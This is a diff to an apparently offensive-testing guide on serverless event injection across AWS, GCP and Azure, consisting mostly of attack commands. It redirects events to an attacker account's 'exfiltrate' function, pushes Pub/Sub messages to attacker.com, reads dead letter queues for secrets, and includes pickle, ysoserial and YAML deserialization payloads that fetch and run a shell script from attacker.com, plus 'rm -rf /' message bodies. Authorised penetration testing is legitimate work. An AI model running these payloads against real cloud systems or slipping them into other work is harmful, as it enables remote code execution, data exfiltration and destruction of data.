@@ -1,45 +1,335 @@
 <serverless_event_injection_guide>
 <title>SERVERLESS EVENT INJECTION</title>
 
-<critical>Serverless event injection attacks target SNS/SQS, EventBridge, Pub/Sub, and Azure Event Grid. Testing focuses on message injection, privilege escalation, and dead letter queue exploitation.</critical>
+<critical>Serverless architectures rely heavily on event-driven communication between services. Event injection attacks exploit weak authentication, insufficient input validation, and overly permissive IAM policies in message queues, event buses, and pub/sub systems. Successful exploitation can lead to remote code execution, data exfiltration, privilege escalation, and cross-account attacks. These vulnerabilities are often overlooked because events are considered "internal" traffic.</critical>
 
 <scope>
-- SNS/SQS message injection
-- EventBridge exploitation
-- GCP Pub/Sub security
-- Azure Event Grid attacks
-- Lambda event source mapping
-- Cross-service privilege escalation
-- Dead letter queue exploitation
+- AWS SNS/SQS message injection and queue poisoning
+- AWS EventBridge rule manipulation and event pattern abuse
+- AWS Step Functions state machine exploitation
+- Lambda event source mapping attacks
+- GCP Pub/Sub subscription hijacking
+- Azure Event Grid and Service Bus attacks
+- Dead letter queue (DLQ) sensitive data exposure
+- Cross-service and cross-account event routing
+- Event deserialization vulnerabilities
+- Message attribute injection
 </scope>
 
+<methodology>
+1. Enumerate all event sources (queues, topics, event buses, subscriptions).
+2. Identify IAM policies governing publish/subscribe permissions.
+3. Test for unauthenticated or weakly authenticated event injection.
+4. Analyze event handlers for deserialization and injection vulnerabilities.
+5. Check for sensitive data in dead letter queues.
+6. Test cross-account event routing capabilities.
+7. Examine event filtering rules for bypass opportunities.
+8. Verify event validation and schema enforcement.
+</methodology>
+
+<testing_techniques>
 <sns_sqs_injection>
 {% raw %}
-# SQS message injection:
-aws sqs send-message \
-  --queue-url https://sqs.region.amazonaws.com/account/queue \
-  --message-body '{"command":"rm -rf /"}'
+# SNS Topic Injection
+# Test if you can publish to SNS topics without proper authentication
 
-# SNS injection:
+# Enumerate SNS topics
+aws sns list-topics --region us-east-1
+
+# Check topic policy for public access
+aws sns get-topic-attributes \
+  --topic-arn arn:aws:sns:us-east-1:123456789:target-topic \
+  --query 'Attributes.Policy'
+
+# Inject malicious message
 aws sns publish \
-  --topic-arn arn:aws:sns:region:account:topic \
-  --message '{"attack":"payload"}'
+  --topic-arn arn:aws:sns:us-east-1:123456789:target-topic \
+  --message '{"action":"admin","user":"attacker","command":"whoami"}' \
+  --message-attributes '{"Type":{"DataType":"String","StringValue":"Command"}}'
+
+# SQS Queue Injection
+# Test direct queue message injection
+
+# Enumerate SQS queues
+aws sqs list-queues --region us-east-1
+
+# Check queue policy
+aws sqs get-queue-attributes \
+  --queue-url https://sqs.us-east-1.amazonaws.com/123456789/target-queue \
+  --attribute-names Policy
+
+# Send malicious message to queue
+aws sqs send-message \
+  --queue-url https://sqs.us-east-1.amazonaws.com/123456789/target-queue \
+  --message-body '{"__proto__":{"admin":true},"action":"delete_all"}'
+
+# Batch injection for amplification
+aws sqs send-message-batch \
+  --queue-url https://sqs.us-east-1.amazonaws.com/123456789/target-queue \
+  --entries '[
+    {"Id":"1","MessageBody":"{\"payload\":\"attack1\"}"},
+    {"Id":"2","MessageBody":"{\"payload\":\"attack2\"}"},
+    {"Id":"3","MessageBody":"{\"payload\":\"attack3\"}"}
+  ]'
 {% endraw %}
 </sns_sqs_injection>
 
 <eventbridge_exploitation>
 {% raw %}
-# EventBridge rule injection:
-aws events put-rule \
-  --name malicious-rule \
-  --event-pattern '{"source":["aws.ec2"]}'
+# EventBridge Rule Injection
+# Create malicious rules to intercept or redirect events
 
-# Put target:
+# List existing rules
+aws events list-rules --event-bus-name default
+
+# Check if you can create rules (IAM misconfiguration)
+aws events put-rule \
+  --name "attacker-rule" \
+  --event-pattern '{"source":["aws.ec2"],"detail-type":["EC2 Instance State-change Notification"]}' \
+  --state ENABLED
+
+# Add malicious target to rule
 aws events put-targets \
-  --rule malicious-rule \
-  --targets "Id=1,Arn=arn:aws:lambda:region:account:function:target"
+  --rule "attacker-rule" \
+  --targets '[{
+    "Id": "attacker-lambda",
+    "Arn": "arn:aws:lambda:us-east-1:ATTACKER_ACCOUNT:function:exfiltrate",
+    "RoleArn": "arn:aws:iam::123456789:role/EventBridgeInvokeRole"
+  }]'
+
+# Event Pattern Bypass - Wildcard abuse
+# If rules use loose patterns, inject events that match
+aws events put-events \
+  --entries '[{
+    "Source": "custom.application",
+    "DetailType": "Admin Action",
+    "Detail": "{\"action\":\"escalate_privileges\",\"target\":\"*\"}",
+    "EventBusName": "default"
+  }]'
+
+# Cross-account event injection (if policy allows)
+aws events put-events \
+  --entries '[{
+    "Source": "aws.ec2",
+    "DetailType": "EC2 Instance State-change Notification",
+    "Detail": "{\"instance-id\":\"i-malicious\",\"state\":\"running\"}",
+    "EventBusName": "arn:aws:events:us-east-1:TARGET_ACCOUNT:event-bus/target-bus"
+  }]'
 {% endraw %}
 </eventbridge_exploitation>
 
-<remember>Serverless events: Test message injection in queues/topics, validate event source authentication, check for privilege escalation via event routing, examine dead letter queues for sensitive data.</remember>
+<lambda_event_source>
+{% raw %}
+# Lambda Event Source Mapping Attacks
+# Manipulate how Lambda processes events from sources
+
+# List event source mappings
+aws lambda list-event-source-mappings \
+  --function-name target-function
+
+# Check for misconfigured batch settings (DoS potential)
+aws lambda get-event-source-mapping \
+  --uuid <mapping-uuid>
+
+# If you can modify mappings, redirect to attacker function
+aws lambda update-event-source-mapping \
+  --uuid <mapping-uuid> \
+  --function-name attacker-function
+
+# DynamoDB Streams injection (if Lambda processes streams)
+# Requires DynamoDB write access
+aws dynamodb put-item \
+  --table-name target-table \
+  --item '{"id":{"S":"malicious"},"payload":{"S":"<script>alert(1)</script>"}}'
+
+# Kinesis Stream injection
+aws kinesis put-record \
+  --stream-name target-stream \
+  --data '{"command":"rm -rf /","escalate":true}' \
+  --partition-key "attack"
+{% endraw %}
+</lambda_event_source>
+
+<step_functions_exploitation>
+{% raw %}
+# AWS Step Functions State Machine Attacks
+
+# List state machines
+aws stepfunctions list-state-machines
+
+# Get state machine definition (look for injection points)
+aws stepfunctions describe-state-machine \
+  --state-machine-arn arn:aws:states:us-east-1:123456789:stateMachine:target
+
+# Start execution with malicious input
+aws stepfunctions start-execution \
+  --state-machine-arn arn:aws:states:us-east-1:123456789:stateMachine:target \
+  --input '{"__proto__":{"isAdmin":true},"action":"delete","target":"*"}'
+
+# If state machine uses JSONPath, test for injection
+aws stepfunctions start-execution \
+  --state-machine-arn arn:aws:states:us-east-1:123456789:stateMachine:target \
+  --input '{"user":"$..*","action":"escalate"}'
+
+# Check execution history for sensitive data
+aws stepfunctions get-execution-history \
+  --execution-arn arn:aws:states:us-east-1:123456789:execution:target:exec-id
+{% endraw %}
+</step_functions_exploitation>
+
+<dead_letter_queue_exploitation>
+{% raw %}
+# Dead Letter Queue (DLQ) Exploitation
+# DLQs often contain sensitive failed messages
+
+# Find DLQ configurations
+aws sqs get-queue-attributes \
+  --queue-url https://sqs.us-east-1.amazonaws.com/123456789/main-queue \
+  --attribute-names RedrivePolicy
+
+# Read messages from DLQ (often less protected)
+aws sqs receive-message \
+  --queue-url https://sqs.us-east-1.amazonaws.com/123456789/main-queue-dlq \
+  --max-number-of-messages 10 \
+  --wait-time-seconds 5
+
+# DLQs may contain:
+# - Failed authentication tokens
+# - API keys in failed requests
+# - PII from failed processing
+# - Stack traces with internal paths
+# - Database connection strings
+{% endraw %}
+</dead_letter_queue_exploitation>
+
+<gcp_pubsub_attacks>
+{% raw %}
+# GCP Pub/Sub Attacks
+
+# List topics
+gcloud pubsub topics list
+
+# Check IAM policy on topic
+gcloud pubsub topics get-iam-policy target-topic
+
+# Publish malicious message
+gcloud pubsub topics publish target-topic \
+  --message='{"command":"cat /etc/passwd","admin":true}'
+
+# Create subscription to intercept messages
+gcloud pubsub subscriptions create attacker-sub \
+  --topic=target-topic \
+  --push-endpoint=https://attacker.com/callback
+
+# Pull messages (if subscription exists)
+gcloud pubsub subscriptions pull target-subscription --auto-ack --limit=100
+{% endraw %}
+</gcp_pubsub_attacks>
+
+<azure_event_attacks>
+{% raw %}
+# Azure Event Grid / Service Bus Attacks
+
+# List Event Grid topics
+az eventgrid topic list
+
+# Check access keys (if exposed)
+az eventgrid topic key list --name target-topic --resource-group rg
+
+# Publish event
+az eventgrid event publish \
+  --endpoint https://target-topic.region.eventgrid.azure.net/api/events \
+  --api-key <stolen-key> \
+  --events '[{
+    "id": "attacker-event",
+    "eventType": "Admin.Escalation",
+    "subject": "/admin/privileges",
+    "data": {"action": "grant_admin", "user": "attacker"},
+    "dataVersion": "1.0"
+  }]'
+
+# Service Bus queue injection
+az servicebus queue send \
+  --namespace-name target-ns \
+  --queue-name target-queue \
+  --message-body '{"malicious": "payload"}'
+{% endraw %}
+</azure_event_attacks>
+
+<deserialization_attacks>
+{% raw %}
+# Event Deserialization Vulnerabilities
+# Many serverless handlers deserialize event payloads unsafely
+
+# Python pickle injection (if handler uses pickle)
+# Base64 encoded pickle payload
+import pickle
+import base64
+class Exploit:
+    def __reduce__(self):
+        import os
+        return (os.system, ('curl attacker.com/shell.sh | bash',))
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+
+# Java deserialization (ysoserial payloads)
+# If Lambda uses Java and deserializes events
+java -jar ysoserial.jar CommonsCollections1 'curl attacker.com' | base64
+
+# Node.js prototype pollution via event
+{
+  "__proto__": {"isAdmin": true},
+  "constructor": {"prototype": {"isAdmin": true}}
+}
+
+# YAML deserialization (if events are YAML)
+!!python/object/apply:os.system ['curl attacker.com/pwned']
+{% endraw %}
+</deserialization_attacks>
+</testing_techniques>
+
+<validation>
+1. Confirm message injection by checking CloudWatch logs for Lambda invocations.
+2. Verify event processing by observing side effects (API calls, database writes).
+3. Test with canary tokens in payloads to detect processing.
+4. Check for error messages revealing internal architecture.
+5. Validate cross-account injection with test accounts you control.
+6. Confirm DLQ access by successfully reading messages.
+7. Verify privilege escalation by testing elevated actions post-injection.
+</validation>
+
+<false_positives>
+- IAM policy may appear permissive but be restricted by SCP or resource policy
+- Queue/topic may exist but have no consumers (no impact)
+- Event injection succeeds but handler validates and rejects payload
+- Cross-account events blocked by organization policies
+- DLQ access granted but messages are encrypted and unreadable
+- Event reaches handler but application-level auth prevents action
+- Test environment vs production may have different policies
+</false_positives>
+
+<impact>
+- Remote code execution via deserialization in Lambda handlers
+- Data exfiltration through malicious event routing
+- Privilege escalation via event-triggered admin functions
+- Denial of service through queue flooding
+- Sensitive data exposure from dead letter queues
+- Cross-account compromise via event bus misconfiguration
+- Supply chain attacks through poisoned event streams
+- Business logic bypass via crafted event sequences
+</impact>
+
+<pro_tips>
+1. Always check dead letter queues - they're frequently overlooked and contain sensitive failed messages.
+2. Event buses often allow cross-account events - test from different AWS accounts.
+3. Look for Lambda functions triggered by events that run with elevated IAM roles.
+4. SNS topics with "Principal": "*" are common misconfigurations in public buckets.
+5. Step Functions state machine definitions often reveal business logic and injection points.
+6. EventBridge rules using broad patterns like "source": ["aws.*"] can be abused.
+7. DynamoDB Streams + Lambda is a common pattern - write access to table = code execution.
+8. Check for message attributes - they're often trusted without validation.
+9. Batch operations amplify attacks - use send-message-batch for DoS testing.
+10. Event ordering assumptions can be exploited - send events out of expected sequence.
+</pro_tips>
+
+<remember>Serverless event systems are trust boundaries. Every queue, topic, and event bus is a potential injection point. Focus on IAM policies, message validation, and handler deserialization. Dead letter queues are goldmines for sensitive data. Cross-account and cross-service event routing dramatically expands the attack surface.</remember>
 </serverless_event_injection_guide>
